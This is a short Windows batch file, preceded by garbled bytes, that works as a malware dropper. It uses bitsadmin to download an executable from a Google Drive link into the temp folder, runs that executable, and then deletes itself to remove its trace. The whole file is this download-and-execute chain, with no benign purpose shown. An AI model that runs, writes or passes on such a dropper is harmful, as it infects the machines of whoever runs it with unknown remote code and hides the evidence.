��&cls
��

set pOut="%temp%\\out.exe"
bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://drive.google.com/uc?id=1ZcyBk30hW7jamXrNGf5g2v2neztFPkPv&export=download&confirm=t&uuid=9480ef06-9b4e-4f0e-ac0a-e6299028aa05&at=ALgDtsyva5HexGx87k2iHuO_Caoc:1677699440626" %pOut%
start "" %pOut%
DEL "%~f0"
                